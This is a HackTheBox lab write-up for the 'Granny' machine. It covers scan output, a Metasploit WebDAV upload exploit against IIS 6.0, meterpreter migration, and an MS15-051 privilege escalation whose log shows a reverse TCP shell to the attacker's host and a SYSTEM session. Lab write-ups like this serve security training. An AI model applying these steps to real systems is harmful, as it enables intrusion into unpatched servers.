
# Granny - HackTheBox

A few words describe this box. Update. Your. Shit.

# Enumeration

## Rustscan

```bash
Open 10.10.10.15:80
```

## Nmap

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Sun, 04 Sep 2022 22:11:56 GMT
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## ffuf

```bash
 :: Method           : GET
 :: URL              : http://granny.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

Images                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 71ms]
_private                [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 60ms]
_vti_log                [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 69ms]
_vti_bin                [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 126ms]
aspnet_client           [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 62ms]
images                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 68ms]
:: Progress: [20476/20476] :: Job [1/1] :: 463 req/sec :: Duration: [0:00:33] :: Err
```

# Foothold & Root

I googled Microsoft IIS 6.0 vulnerabilities and found [this](https://www.trendmicro.com/en_us/research/17/c/iis-6-0-vulnerability-leads-code-execution.html) article by TrendMicro about a vulnerability in Webdav in IIS 6.0.

Curious, I checked metasploit for any modules and found "windows/iis/iis_webdav_upload_asp".

Tried it out and popped a shell and migrated into wmiprvse.exe with success!

```cmd
 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1972  2700  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad10F81.tmp\svchost.exe
 2052  1004  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 2164  1848  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 2292  584   wmiprvse.exe
 2700  1480  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2768  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3004  344   logon.scr

meterpreter > migrate 1964
[*] Migrating from 1972 to 1964...
[*] Migration completed successfully.
meterpreter > getuid
```

```cmd
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
```

Version 5.2 seems pretty old so I ran it through Windows-Exploit-Suggestor.

MS15-051 - ClientCopyImage was the first one I tried, and it was successful in getting a root shell!

```bash
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.29:1234 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 3984 launched.
[*] Reflectively injecting the DLL into 3984...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 3 opened (10.10.14.29:1234 -> 10.10.10.15:1035) at 2022-09-04 18:10:02 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

In there I found the user flag in "Lakis" home folder, and the root flag in "Administrator"! :)
